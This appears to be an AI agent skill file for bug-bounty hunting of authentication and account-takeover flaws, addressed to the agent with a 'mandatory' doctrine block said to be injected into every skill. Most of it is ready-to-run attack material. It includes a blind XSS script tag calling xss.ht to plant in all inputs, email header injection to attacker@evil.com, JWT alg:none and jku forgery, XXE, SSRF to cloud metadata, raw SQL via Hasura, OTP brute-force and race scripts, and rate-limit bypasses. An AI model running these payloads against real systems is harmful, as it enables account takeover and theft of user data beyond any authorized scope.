---
name: check-in
description: Use when any auth endpoint is in scope — login present, /register exists, password reset visible, JWT or OAuth tokens in traffic, SAML assertion in Burp, 2FA/MFA enforced, /graphql responds, WebSocket upgrade observed, or any cross-user action being tested. Load before touching any auth endpoint.
---

<!-- MANDATORY-JS-RECON-DOCTRINE v3 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, source map, service worker, and inline script leaks endpoints, secrets, roles,
> feature flags, and business logic the server never meant you to see. Hunters who skip JS lose the P1s.

**Crawl (all five tool-classes, every live host):** waybackurls + gau --subs + waymore · katana -jc -jsl -kf all + hakrawler + gospider + cariddi -intensive · service workers (sw.js, manifest paths) · inline `<script>` blocks + SSR state blobs (window.__NEXT_DATA__, __NUXT__, __remixContext) · framework chunks (Next.js build-manifest.json, Nuxt manifest, Vite /assets/)

**Recover + deobfuscate + read:** js-beautify · sourcemapper (source maps) · webcrack (webpack modules) · synchrony (obfuscator.io) · Node eval-intercept (p,a,c,k,e,d) — read every file end-to-end

**Hunt the money list:** AI keys (sk-, sk-ant-, hf_, r8_, gsk_) · AWS AKIA · Stripe sk_live_ · GitHub ghp_ · SSR state leaks · WebSocket/SSE endpoints · hidden routes · IDOR seeds · DOM-XSS sinks · postMessage without origin check

**Canonical doctrine:** `~/.claude/skills/js-recon-agent/references/00-MANDATORY-JS-RECON-DOCTRINE.md`

---

# Check-In: Authentication & ATO Hunt

## Deep References
- Curl PoCs for every class: `~/.claude/skills/js-recon-agent/references/13-auth-failures-and-flows.md`
- BLF P1/P2 classes: `~/.claude/skills/js-recon-agent/references/19-high-impact-blf.md`

---

## Quick Reference — What You See → What You Test

| Observed on target | Phase | Highest-yield check first |
|---|---|---|
| `/register`, `/signup` | Phase 1 | Pre-registration hijack → mass assignment → email header injection |
| `/forgot-password`, reset email | Phase 2 | Host header injection ⚡ → reset token in URL → JSON param pollution |
| `eyJ...` JWT in cookie/header/response | Phase 3 JWT | `alg:none` → RS256→HS256 → `kid` SQLi → mixed-case None |
| `/oauth/authorize` + `?code=` in URL | Phase 3 OAuth | PKCE downgrade → `redirect_uri` trailing slash → account linking no re-auth |
| SAML `SAMLResponse` in POST body | Phase 3 SAML | XSW → signature skip → entityId normalization |
| `/graphql` or GraphQL in JS | Phase 3 GraphQL | Engine fingerprint → `_entities` → Hasura `/v2/query` → alias batching |
| Login → OTP/TOTP/SMS step | Phase 4 | Response manipulation ⚡ → OTP in response body → step skip |
| Email/phone verify required | Phase 5 | Token swap → step skip → not re-triggered on email change |
| Stripe/payment/subscription gate | Phase 5 | Param injection → forged webhook → price manipulation |
| Any authenticated session | Phase 6 | Email×SSO chain → session not invalidated → SCIM abuse |
| Firebase/Auth0/Cognito/Okta/Supabase detected | Phase 6 Cloud | Platform-specific misconfig section |
| `Access-Control-Allow-Origin` in response | Phase 6 | CORS + credentials + `Allow-Credentials: true` |
| `101 Switching Protocols` / WS in JS | Phase 6 | WebSocket auth bypass → subscription firehose |
| `redirect_uri` / `callback_url` / `request_uri` / ACS URL param | Phase 2+3 | SSRF pivot → interactsh OOB → `/ssrf-hunter-agent` |

---

## Step 0 — Auth Stack Triage (run this before any phase)

**Read the app before testing anything.** 10 minutes here eliminates 2 hours of irrelevant testing.

**1. Log in fully in Burp.** Complete every step: login → 2FA → email verify → onboarding. Auth bugs hide in flows most hunters skip.

**2. Identify the token format from traffic:**
```bash
# Paste any token you see in cookies/headers/responses
TOKEN="<paste_here>"
python3 -c "
import sys, base64, json
p = '$TOKEN'.split('.')
if len(p)==3:
    pad = p[1] + '=='*((4-len(p[1])%4)%4)
    print('JWT →', json.dumps(json.loads(base64.b64decode(pad)), indent=2))
else: print('Not JWT — opaque session cookie or API key')"
```

**3. Build your phase map — activate only what the target uses:**

| Signal in traffic | Activate | Skip |
|---|---|---|
| `eyJ...` JWT anywhere | Phase 3 JWT (all tests) | — |
| `/oauth/`, `?code=`, refresh tokens | Phase 3 OAuth (all tests) | — |
| `SAMLResponse` in POST | Phase 3 SAML (all tests) | — |
| `/graphql` responds 200 | Phase 3 GraphQL (all tests) | — |
| Login → OTP/TOTP/SMS prompt | Phase 4 (all tests) | — |
| No 2FA at all | — | Phase 4 entirely |
| No SAML | — | Phase 3 SAML |
| No GraphQL | — | Phase 3 GraphQL |
| Firebase/Auth0/Cognito/Okta detected | Phase 6 Cloud | — |

**4. Time-box rule:** run all ⚡ items first (30 min). Fill rest after. ⚡ items are the ones that pay — always do them before running full ledger.

**5. When you find something — escalate immediately, don't finish the phase first.** A confirmed P1 goes to report draft now. Continue the hunt in parallel.

---

## ⚡ PRE-HUNT SETUP (mandatory before any auth testing)

**Two accounts — no exceptions.** Per standing rule: create attacker (A) + victim (B) accounts before touching any auth endpoint. Temp-mail fine (mail.tm / mail.gw). Never bypass captcha — human-in-the-loop split. Single-account auth testing is incomplete; BOLA/IDOR/horizontal privesc require a victim to prove leakage.

```bash
# Quick account setup
curl -s https://api.mail.tm/accounts -X POST -H 'Content-Type: application/json' \
  -d '{"address":"attacker_a@<domain>","password":"P@ssw0rd1"}' | jq .

# Session ID — record before every hunt; required to answer Q8 in Phase 8 triage gate
export BBHUNT_SESSION=$(date +%s | sha256sum | cut -c1-12)
echo "[SESSION] $BBHUNT_SESSION"
```

**Blind XSS plant — mandatory on every web target.** During crawl, plant in ALL: name/bio/profile fields, feedback forms, support tickets, order notes, file upload metadata, User-Agent/Referer headers, job application forms, PDF/invoice generation inputs.
```
<script src=//xss.ht></script>
<!-- also try: "><script src=//xss.ht></script> and '-alert(1)-' variants -->
```

**Auth flow map — extract before running checklist.** Pull all auth endpoints from JS recon output:
```bash
# From katana/gau output, extract auth surface
grep -Ei '(login|auth|token|oauth|saml|sso|mfa|otp|verify|reset|signup|register|session|refresh|logout)' urls.txt | sort -u
# Decode JWTs on the wire immediately
echo "<token>" | python3 -c "import sys,base64,json; p=sys.stdin.read().strip().split('.'); print(json.dumps(json.loads(base64.b64decode(p[1]+'==').decode()),indent=2))"
```

**Rate-limit fingerprint before brute-forcing anything:**
```bash
# Per-IP vs per-account — send 10 rapid requests, check response diff
for i in $(seq 1 10); do curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target/api/login \
  -H 'Content-Type: application/json' -d '{"email":"victim@test.com","password":"wrong"}'; done
# X-Forwarded-For bypass test
curl -X POST https://target/api/login -H 'X-Forwarded-For: 1.2.3.4' -d '{"email":"...","password":"..."}'
```

---

## Phase 1 — Unauthenticated Registration & Pre-Auth ATO

- [ ] **Pre-registration hijacking** — register `victim@target.com` before victim does; victim triggers SSO (Google/GitHub) → account merge → attacker owns merged account. Tool: automate with temp-mail + registration form.
- [ ] **Punycode/Unicode normalization ATO** ⚡P1 — register `ⓐttacker@domain.com` (Unicode confusable of victim email); server normalizes both to same canonical form → mapped to victim account. Zero interaction from victim.
  ```bash
  python3 -c "print('ⓐttacker@victim.com'.encode('idna'))"
  ```
- [ ] **Concurrent registration race** — two simultaneous POSTs registering same email; both succeed → duplicate accounts with split state; one may bypass email verification
  ```bash
  seq 2 | xargs -P2 -I{} curl -s -X POST https://target/register -d 'email=test@x.com&pass=Abc123!'
  ```
- [ ] **Mass assignment on signup** — inject `role=admin`, `is_verified=true`, `plan=enterprise`, `email_verified=true`, `is_superuser=true` in registration body; try both JSON and form-encoded
- [ ] **Email header injection** ⚡P1 — `\n` in JSON email field → inject `Bcc:` header → reset link delivered to attacker
  ```bash
  curl -X POST https://target/forgot-password -H 'Content-Type: application/json' \
    -d '{"email":"victim@x.com\nBcc:attacker@evil.com"}'
  ```
- [ ] **Email enumeration** — timing difference (≥100ms) or distinct error on `/register` / `/reset` confirms account existence
- [ ] **Unauthenticated SSO/SAML provider registration** — POST to `/api/sso/providers` without auth; register attacker IdP; victim SSO → attacker IdP handles assertion
- [ ] **Open dynamic client registration (RFC 7591)** — `POST /oauth/register` without Bearer; register `redirect_uri=https://evil.com`; use in auth code flow to steal codes
  ```bash
  curl -X POST https://target/.well-known/oauth/register -H 'Content-Type: application/json' \
    -d '{"client_name":"evil","redirect_uris":["https://attacker.com/cb"],"grant_types":["authorization_code"]}'
  ```
- [ ] **Account lockout abuse** — lockout victim account via N failed attempts as DoS; check error message divergence (locked vs wrong-password) for account enumeration

**→ Phase 1 exit:** Found pre-registration hijack or unverified email merge? → Write P1 report immediately. Found mass assignment? → Test it in Phase 6 privesc section too. Found email enumeration? → Use it to seed victim accounts for Phase 6 BOLA tests.

---

## Phase 2 — Password Reset & Token Abuse

- [ ] **Host header injection** ⚡P1 — `Host: attacker.com` or `X-Forwarded-Host: attacker.com` on reset request → link in email points to attacker domain
  ```bash
  curl -X POST https://target/forgot-password -H 'Host: attacker.com' -d 'email=victim@x.com'
  ```
- [ ] **Predictable / short token** — capture token from own account; check entropy (timestamp-seeded = ms-precision UNIX; UUID v1 = time-based; sequential = trivial). Hashcat if short.
  ```bash
  hashcat -a 3 -m 0 <hash> ?d?d?d?d?d?d  # 6-digit token brute
  ```
- [ ] **Token reuse** — use reset link a second time after password already changed; should reject
- [ ] **Token not invalidated on new password set** — set new password, request another reset, use old token
- [ ] **Token not user-bound** — extract token from accountA reset email; submit with accountB's identifier → reset B's password
- [ ] **Verification-token reuse across steps** — multi-step flow (enter email → verify token → set password); replay step-2 token at step-3 from a different email session
- [ ] **Pre-signed / time-limited URL not session-bound** — magic link reusable across different browser sessions / user accounts; forward to friend to test
- [ ] **Passwordless magic-link prefetch consumption** — email scanners (ProofPoint, Microsoft ATP) pre-fetch links; if token burned on GET, user locked out; attacker wins on allowlisted scanner IP
- [ ] **Deprovisioning timing attack** — delete/suspend account → race window before tokens invalidated → continue hitting authenticated APIs with old session token
- [ ] **Concurrent password reset tokens** — fire two simultaneous reset requests; both tokens issued; neither invalidates the other; attacker who intercepted old email link can still use it after victim uses theirs
  ```bash
  seq 2 | xargs -P2 -I{} curl -s -X POST https://target/forgot-password \
    -H 'Content-Type: application/json' -d '{"email":"victim@x.com"}'
  ```
- [ ] **Reset link valid after email change** — victim changes email to new address; old reset link (addressed to original email) still works → if attacker had captured old link, full ATO after victim updates email
- [ ] **Password reset token in URL → Referer leak** — token passed as `?token=` query param; third-party analytics (GA4, Mixpanel, Segment, Hotjar) receive it via `Referer` header on every subsequent resource load; token harvested without email access
  ```bash
  # Confirm token is in URL, not in POST body or email header
  curl -v -X GET "https://target/reset-password?token=<tok>" 2>&1 | grep -i referer
  # Then check: does target load any third-party JS on the reset page?
  ```
- [ ] **Session token in URL** — `?session=`, `?token=`, `?auth=`, `?access_token=` in query string → leaked to server logs, CDN logs, browser history, Referer headers of any embedded resource; find via JS recon + traffic analysis
- [ ] **JSON parameter pollution on email field** — `{"email":"victim@x.com","email":"attacker@x.com"}`; Express/Node uses last, PHP uses first, Python uses last; reset email delivered to victim's address but confirmation/callback triggered on attacker's
  ```bash
  curl -X POST https://target/forgot-password -H 'Content-Type: application/json' \
    -d '{"email":"victim@x.com","email":"attacker@evil.com"}'
  ```

**⚠ SSRF pivot:** `redirect_uri`, `callback_url`, `return_url` params in reset/verify flows → test with `https://your.interactsh.com` as value; if server fetches it server-side → SSRF; escalate with `/ssrf-hunter-agent`.

**→ Phase 2 exit:** Found host header injection? → P1 report now. Found token in URL? → Check every page that loads third-party JS (GA4, Segment, Hotjar) and include in PoC. Found concurrent tokens? → Document both token values as evidence. Move to Phase 3 only after confirming which protocol stack (JWT/OAuth/SAML) is in use.

---

## Phase 3 — Authentication Protocol Bypass

### JWT — tool: `python3 -m jwt_tool <token> -t https://target/api/me`

- [ ] `alg: none` → `jwt_tool <tok> -X a` — strip signature; server accepts unsigned token
- [ ] RS256 → HS256 confusion — `jwt_tool <tok> -X s -pk server_pubkey.pem` — sign with server's own public key
- [ ] `jku` / `x5u` / embedded `jwk` injection — `jwt_tool <tok> -X j` / `-X u` / `-X k` → point to `https://attacker.com/jwks.json`
- [ ] `kid` SQLi — `jwt_tool <tok> -I -hc kid -hv "' UNION SELECT 'attacker_secret'--"` → server queries kid into SQL, returns attacker secret
- [ ] `kid` path traversal — `kid: "../../dev/null"` → HMAC key = empty string → sign with `""`
- [ ] Claims not validated — manually forge `iss`, `aud` to arbitrary values; advance `exp` 10 years
- [ ] Weak HS256 secret — `hashcat -a 0 -m 16500 <token> rockyou.txt`
- [ ] `sub: null` / `sub: ""` / `sub: 0` — maps to first DB row (admin) in many ORMs
- [ ] `sub: ../admin` — path traversal in sub claim if used as file/directory lookup
- [ ] **`alg: None` mixed-case bypass** ⚡ — `"alg":"None"` / `"alg":"NONE"` / `"alg":"nOnE"` bypasses case-sensitive `=== "none"` blocklist check; server normalizes before verifying but blocklist runs first on raw string
  ```bash
  # jwt_tool does not auto-test mixed case — manually craft:
  python3 -c "
  import base64, json
  h = base64.urlsafe_b64encode(json.dumps({'alg':'None','typ':'JWT'}).encode()).rstrip(b'=').decode()
  p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
  print(f'{h}.{p}.')"
  ```
- [ ] **`exp` claim not validated** — expired tokens accepted indefinitely; advance `exp` to year 2099 and confirm server doesn't reject; also test missing `exp` field entirely
  ```bash
  jwt_tool <token> -I -pc exp -pv 9999999999 -S hs256 -p ""  # resign with empty secret after nullifying exp
  ```

### OAuth / OIDC

- [ ] `state` CSRF — capture auth URL; strip `state=`; send victim the modified URL; code arrives without state validation
- [ ] `redirect_uri` bypass — try: `https://target.com@evil.com`, `https://evil.com/..%2f..%2ftarget.com`, open-redirect chain `https://target.com/redir?url=https://evil.com`
- [ ] Authorization code reuse — extract code from Referer/logs after exchange; replay `POST /token` — should return `invalid_grant`
- [ ] PKCE downgrade — remove `code_challenge` and `code_challenge_method` entirely from auth request; server issues code without PKCE → steal and exchange with no verifier
- [ ] `client_secret` in JS — `grep -r "client_secret" ./ --include="*.js"` → mint tokens as the application
  ```bash
  curl -X POST https://target/oauth/token -d 'grant_type=client_credentials&client_id=X&client_secret=Y'
  ```
- [ ] `request_uri` SSRF — `request_uri=https://attacker.com/evil.jwt` → server fetches attacker-controlled JWT claims; also pivot to internal SSRF: `request_uri=http://169.254.169.254/latest/meta-data/` → escalate with `/ssrf-hunter-agent`
- [ ] `nonce` / `iss` / `aud` not validated in OIDC ID token — mint ID token with different `aud`; present to target's `/callback`
- [ ] **Refresh token rotation reuse-detection bypass** — exchange refresh token → get new pair → replay old refresh token; server should reject but often doesn't
- [ ] **Device authorization flow abuse** — `POST /device/code` → `device_code` + `user_code`; poll `/token` with `device_code` before user visits verification URL; steal session if polling not rate-limited
- [ ] **OAuth token scope escalation** — after auth, POST `/token` requesting broader scopes (`scope=admin read:all`) than originally granted
- [ ] Referer leaks code — check JS `<img>`, `<script>`, third-party analytics loading after `/callback?code=`
- [ ] **`state` null byte injection** — `state=valid_value%00garbage`; null byte truncates string in some PHP/Java framework comparisons; CSRF state validation passes on truncated value while attacker-appended payload rides through
  ```bash
  # Construct auth URL with null byte in state
  https://target/oauth/authorize?client_id=X&state=csrf_token%00x&redirect_uri=https://target/callback
  ```
- [ ] **`redirect_uri` trailing slash / dot bypass** — whitelist is `https://target.com/callback`; try `https://target.com/callback/`, `https://target.com/callback/.`, `https://target.com/callback%0a`, `https://target.com/callback?x=1`; many validators do prefix match only
- [ ] **OAuth refresh token not invalidated on logout** — user logs out → access tokens expire on TTL → but refresh token persists; attacker with stolen refresh token silently re-authenticates days later
  ```bash
  # After logout, attempt silent re-auth with captured refresh token
  curl -X POST https://target/oauth/token -d \
    'grant_type=refresh_token&refresh_token=<captured_refresh>&client_id=X&client_secret=Y'
  ```
- [ ] **OAuth account linking without re-auth / MFA** — POST to `/settings/oauth/link` or `/account/connect` with Google/GitHub OAuth code while authenticated; no password re-confirmation, no MFA step; attacker with brief session (XSS, fixation, CSRF) links own IdP → permanent ATO
  ```bash
  # CSRF page to link attacker's Google account to victim's account
  # Victim visits attacker page → attacker's OAuth code submitted to /account/connect
  ```

### SAML — tool: `saml-raider` Burp extension

- [ ] XSW (XML Signature Wrapping) — duplicate signed `<Assertion>`; modify copy; move original to extension node where validator checks but app ignores; saml-raider automates all 8 XSW types
- [ ] XXE in SAML — inject `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion; `&xxe;` in NameID
- [ ] Signature validation skipped — base64-decode assertion; change `NameID` to victim; re-base64 WITHOUT re-signing; send raw
- [ ] NameID injection — `<NameID>admin</NameID>` or `admin@target.com`
- [ ] **entityId normalization mismatch** ⚡$10.5k — `target.com` vs `TARGET.COM` vs `target.com/` — IdP validates one form, SP accepts another → forge assertion for different SP
- [ ] Response replay — save valid response; replay to `/saml/acs` minutes later; no `InResponseTo` / time check
- [ ] **SAML `AssertionConsumerServiceURL` SSRF** — `AssertionConsumerServiceURL="https://your.interactsh.com"` in AuthnRequest; IdP POSTs assertion to attacker URL; or use internal URL to pivot → escalate with `/ssrf-hunter-agent`

### Null / Type-Confusion Bypass

- [ ] `{"password": null}` / `""` / `[]` / `false` — PHP `null == empty == false == 0` loose comparison
- [ ] MongoDB injection — `{"username": "admin", "password": {"$ne": null}}` or `{"$gt": ""}` — always-true operator bypasses credential check
- [ ] JSON type confusion — `{"password": true}` or `{"password": 0}` — some backends cast to string `"true"` which matches stored hash of string `"true"`
- [ ] Array injection — `password[]=` in form data → PHP `password = [""]` → empty-string comparison bypass

### Legacy / Parity Gaps

- [ ] `/api/v1/login` skips 2FA; `/api/v2/login` enforces it — always fuzz version prefix
- [ ] WordPress/CMS XMLRPC — `system.multicall` batches auth calls before rate-limit triggers; auth bypass for SSO plugins paid $10k–$17k
  ```bash
  curl -X POST https://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>...'
  ```
- [ ] Mobile API (`/mobile/v1/auth`, `/app/login`, `/api/app`) — stripped-down backend, often no MFA / weaker rate-limit

### GraphQL Auth — Deep Coverage

**Tools:** `graphw00f` (engine fingerprint) · `clairvoyance` (schema recovery) · `graphql-cop` (automated checks) · InQL Burp extension

#### Engine Fingerprint First
```bash
graphw00f -d -t https://target/graphql  # identify engine → engine-specific CVEs
# Apollo, Hasura, Strawberry, Postgraphile, Graphene each have distinct bug classes
```

#### Schema Recovery (introspection disabled)
- [ ] `clairvoyance` wordlist attack — infers schema from `Did you mean X?` error suggestions
  ```bash
  python3 -m clairvoyance -o schema.json https://target/graphql
  ```
- [ ] `__type` inline fragments still work when `__schema` blocked — `query { ... on User { __typename } }` resolves type info; enumerate field by field: `__type(name:"Mutation") { fields { name args { name type { name kind ofType { name } } } } }`
- [ ] JS bundles — Apollo/Relay embed full schema as `schema.json` or `__generated__/` in source map; recover with `sourcemapper` + grep for `__schema`
- [ ] Manual path enum (graphql-path-enum not available) — use `__type(name:"Query") { fields { name } }` + `__type(name:"Mutation") { fields { name args { name } } }` to walk the full tree; or run `clairvoyance` with a custom wordlist

#### Unauthenticated Execution
- [ ] Run every mutation/query without auth header — GraphQL middleware often sits at REST gateway; subgraphs/direct endpoint unprotected
- [ ] **Batching bypass** ⚡P1 — `[{"query":"mutation{...}"},{"query":"mutation{...}"}]` array; auth middleware and rate-limiter count batch as 1 request; 100 login attempts in one HTTP call
  ```bash
  # Rate-limit bypass via alias batching — 100 login attempts, 1 HTTP request
  python3 -c "
  aliases = ''.join([f'a{i}: login(email:\"victim@x.com\",password:\"guess{i}\"){{token}}' for i in range(100)])
  print('{\"query\":\"{' + aliases + '}\"}')" | curl -s -X POST https://target/graphql \
    -H 'Content-Type: application/json' -d @-
  ```
- [ ] GraphQL Playground / GraphiQL left enabled in prod — full schema + execution, no auth; check `/graphql`, `/graphiql`, `/playground`, `/api/graphql`

#### Federation / Schema Stitching Auth Gaps
- [ ] **Subgraph direct access** ⚡P1 — Apollo Federation subgraphs (`/graphql/users`, `/graphql/orders`) exposed directly; gateway enforces auth, subgraphs don't; hit subgraph URLs directly, bypass gateway
- [ ] **`_entities` query** ⚡P1 — federation resolver trusts `__typename` + key from gateway; no user-level auth on entities query; designed for inter-service calls
  ```bash
  curl -X POST https://target/graphql/users -H 'Content-Type: application/json' \
    -d '{"query":"query{_entities(representations:[{\"__typename\":\"User\",\"id\":\"victim_uuid\"}]){...on User{email passwordHash role}}}"}'
  ```
- [ ] `@external` / `@key` fields — forge `__typename` + key values to resolve cross-service objects without ownership check
- [ ] Apollo Federation — `__ApolloServiceDefinition__` endpoint leaks full federation service config; `/_graphql` or `/.well-known/apollo/server-health` fingerprints version

#### Field-Level Auth Gaps
- [ ] Object auth but not field auth — query `user(id:1) { email passwordHash secretToken internalNotes apiKeys { key } }` — resolver protects the parent object but sensitive fields have no individual check
- [ ] Cross-object relationship traversal — `order(id:456) { user { email creditCard billingAddress } }` — traversing relationship edges bypasses direct object auth
- [ ] **Auth directive bypass** — custom `@auth`, `@hasRole`, `@isAuthenticated` directives are resolver-level; find same field accessible via different parent type lacking the directive
- [ ] **Directive inheritance not propagated** — `type Query @auth { user: User }` protects the query but not `User.sensitiveField`; reach sensitive field through an unprotected resolver path that hits same DB table
- [ ] **Fragment spread bypass** — auth check on top-level selection set; include sensitive fields via `...AdminFields` spread fragment — check on query name passes, spread executes
- [ ] **`@defer` / `@stream` directives** — newer GraphQL streaming resolvers skip auth applied to synchronous resolvers in some Apollo/Yoga implementations

#### Relay / Global Node ID IDOR
- [ ] **`node(id:...)` global fetcher** ⚡P1 — decode base64 Relay ID (`atob("VXNlcjox")` → `"User:1"`); swap numeric part; re-encode; `node` resolver often has weaker auth than type-specific resolver
  ```bash
  # Decode, increment, re-encode
  python3 -c "import base64; print(base64.b64encode(b'User:2').decode())"
  # Query: { node(id: "<new_id>") { ... on User { email role passwordHash } } }
  ```
- [ ] `nodeId` / `globalId` in Postgraphile, Hasura Relay — same pattern; `node` resolver bypasses row-level security
- [ ] Cursor-based pagination — `after: "<base64_cursor>"` cursors encode DB row position; tamper to access other users' paginated data

#### Persisted Query Abuse
- [ ] **APQ registration** — send unknown hash → server responds `PersistedQueryNotFound`; follow up with hash + full query → server stores it; now execute attacker-registered query via hash alone; bypasses WAF query-depth rules
  ```bash
  # Step 1: register malicious query
  curl -X POST https://target/graphql -H 'Content-Type: application/json' \
    -d '{"query":"query{user(id:1){email passwordHash}}","extensions":{"persistedQuery":{"version":1,"sha256Hash":"<sha256_of_query>"}}}'
  # Step 2: execute via hash only — bypasses query inspection
  curl -X POST https://target/graphql -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}'
  ```
- [ ] Trusted document / whitelist bypass (Relay, Shopify model) — find whitelist CDN path or endpoint; inject malicious query into document store; now it carries server trust

#### Subscription Auth
- [ ] WS `subscribe` message not re-validated — auth checked at HTTP upgrade (`onConnect`); reconnect after token expires → still receives events; token not verified per-message
- [ ] **Subscription ID hijack** — subscriptions keyed by predictable/sequential `subscriptionId`; subscribe to victim's live data stream
  ```bash
  wscat -c wss://target/graphql -H "Upgrade: websocket" \
    -x '{"type":"connection_init","payload":{"Authorization":"Bearer <attacker_token>"}}'
  # Then subscribe with victim's subscription ID
  -x '{"id":"<victim_sub_id>","type":"subscribe","payload":{"query":"subscription{orderUpdates{total status}}"}}'
  ```
- [ ] **Subscription filter server-side vs client-side** — `subscription { orders(userId: "attacker") }` filter applied in client; server pushes all users' realtime events; strip filter from subscription query → full firehose

#### Hasura-Specific ⚡High Yield
- [ ] `x-hasura-admin-secret` in JS bundle → full DB read/write/schema access
- [ ] `x-hasura-role: admin` header accepted without token when `HASURA_GRAPHQL_ADMIN_SECRET` unset
- [ ] Row-level permission bypass — permission `user_id = X-Hasura-User-Id` but mutation input overrides `where` clause
- [ ] `/v1/metadata` and `/v2/query` endpoints — separate from GraphQL endpoint, often no auth; read all table permissions, run raw SQL
  ```bash
  curl https://target/v2/query -X POST -H 'Content-Type: application/json' \
    -d '{"type":"run_sql","args":{"sql":"SELECT * FROM users LIMIT 10"}}'
  ```
- [ ] Event triggers / cron jobs / actions — `/v1/metadata` lists all triggers; webhook URLs in event triggers may be attacker-controllable

#### Malformed Query Auth Bypass
- [ ] Auth middleware throws on validation error before resolver executes — in some engines the resolver still runs on the error path; send intentionally malformed query + valid operation in same batch
- [ ] Deeply nested query — auth checks bail at depth N; send depth N+1; resolver executes past auth layer
- [ ] Variable type confusion — send string where Int expected → some resolvers skip auth on type-error code path; error response still returns partial data

**→ Phase 3 exit:** Found JWT forgery (alg:none, RS256→HS256)? → P1 now. Found OAuth PKCE downgrade + open redirect? → Chain them, write P1. Found Hasura `/v2/query` unauthed? → P1. Found SAML XSW? → P1. Protocol bypass confirmed → move to Phase 4 if target has 2FA, else skip to Phase 5/6.

---

## Phase 4 — 2FA / MFA Bypass

- [ ] **Step skip** ⚡P1 — after password auth, skip OTP step; POST directly to first post-login endpoint; if session cookie issued pre-OTP, it may be valid
  ```bash
  # Capture session cookie after password step; skip OTP; hit /dashboard directly
  curl -b "session=<post-password-cookie>" https://target/dashboard
  ```
- [ ] **OTP brute force** — 6-digit TOTP = 1,000,000 space; 4-digit SMS = 10,000. Test rate-limit: per-IP (bypass with X-Forwarded-For), per-account (rate resets on new session), per-OTP-attempt (send concurrent not sequential)
  ```bash
  ffuf -u https://target/verify-otp -X POST -d '{"otp":"FUZZ"}' -w <(seq -w 0 9999) \
    -H 'Cookie: session=<tok>' -mc 200 -t 50
  ```
- [ ] **OTP reuse** — valid code accepted on second submission within 30-second TOTP window
- [ ] **OTP race condition** — 50 concurrent requests with same code; one slips through before server burns it
  ```bash
  seq 50 | xargs -P50 -I{} curl -s -X POST https://target/verify-otp \
    -H 'Cookie: session=<tok>' -d '{"otp":"123456"}'
  ```
- [ ] **Enrollment race** — start 2FA enrollment (GET `/mfa/setup`) and simultaneously POST authenticated action; window where MFA not yet enforced on session
- [ ] **Remember-device cookie** — decode value; check if it's a static flag (`remember=true`), not user-bound (copy from accountA to accountB session), or unsigned JWT
- [ ] **Legacy endpoint skips MFA** — check all versioned login paths; older mobile/API auth routes often lack MFA middleware
- [ ] **Backup code brute force** — 8-char alphanumeric = 218 trillion but rate-limit pool often separate and softer; request new codes to check invalidation
- [ ] **Auth state machine out-of-order** ⚡P1 — Snapchat 969-upvote pattern: complete OTP step → logout → resubmit OTP step state → proceed to login without current password; test by replaying POST to `/verify-otp` after logout
- [ ] **Client-side OTP burn** — OTP "marked used" only in JS; replay same OTP in different browser/incognito/curl session — server re-accepts
- [ ] **WebAuthn/Passkey flaws** — replay challenge (present saved authenticatorData to new assertion); wrong `rpId` accepted; `userHandle` maps to admin; counter not monotonically enforced (replay old counter)

### Response & Token Implementation Bugs ⚡ High Yield

- [ ] **Response manipulation — HTTP status** ⚡ — intercept OTP verification response; change `HTTP/1.1 400` → `HTTP/1.1 200 OK`; server reads result from its own response body in some middleware chains; $2,500–$12,000 paid repeatedly
  ```
  Burp: Intercept → Response → Change: HTTP/1.1 400 Bad Request → HTTP/1.1 200 OK
  Also flip: {"verified":false} → {"verified":true} | {"success":0} → {"success":1} | {"status":"fail"} → {"status":"success"}
  ```
- [ ] **Response manipulation — body flag** ⚡ — status stays 200; server-side check result written to JSON response; client-side logic trusts it; `"authenticated":false → true`, `"mfa_passed":false → true`, `"code":"invalid" → "valid"`
- [ ] **OTP leaked in API response body** ⚡ — `POST /send-otp` or `POST /resend-code` response contains OTP in plaintext: `{"message":"OTP sent","code":"123456"}`; also check base64 or hex-encoded fields; extremely common on mobile/private APIs
  ```bash
  curl -s -X POST https://target/api/send-otp \
    -H 'Content-Type: application/json' -d '{"phone":"+1234567890"}' | jq .
  # Hunt: code, otp, token, pin, secret, verification_code, data.otp fields
  ```
- [ ] **OTP not expiring** — OTP valid for hours/days instead of 30s; request OTP, wait 10 min, submit → still accepted; no time pressure on brute-force
  ```bash
  sleep 600 && curl -X POST https://target/verify -d '{"otp":"<captured_code>"}'
  ```
- [ ] **TOTP secret re-fetchable after enrollment** — `/api/mfa/setup`, `/api/2fa/configure`, `/user/totp/secret` returns `secret` in response even after 2FA fully enrolled; brief authenticated access → permanent code derivation
  ```bash
  curl -s https://target/api/mfa/setup -H 'Authorization: Bearer <tok>' | jq . | grep -i secret
  ```
- [ ] **TOTP QR code endpoint re-fetchable** — `/api/mfa/qrcode` or `/auth/2fa/qr.png` returns setup QR after enrollment; QR encodes `otpauth://totp/...?secret=<SECRET>`
  ```bash
  curl -s https://target/api/mfa/qrcode -H 'Authorization: Bearer <tok>' -o qr.png && zbarimg qr.png
  ```
- [ ] **2FA bypass via password-change flow** ⚡ — `POST /account/change-password` with current+new password issues new session token without requiring 2FA; parallel code path bypasses MFA-enforced login
  ```bash
  curl -X POST https://target/account/change-password \
    -H 'Authorization: Bearer <pre-mfa-token>' \
    -d '{"current_password":"old","new_password":"new123!"}' | grep -i token
  ```
- [ ] **OTP valid across all accounts — shared TOTP secret** ⚡P1 — TOTP seeded by server-wide static value or timestamp (not user-specific); your valid code works on any account; test: generate OTP from accountA, submit on accountB's 2FA prompt
- [ ] **Concurrent OTP generation race — two valid codes** — race two `POST /send-otp` in parallel; server issues two codes; both valid until first consumed; captured older code still works
  ```bash
  seq 2 | xargs -P2 -I{} curl -s -X POST https://target/send-otp \
    -H 'Content-Type: application/json' -d '{"email":"victim@x.com"}'
  ```
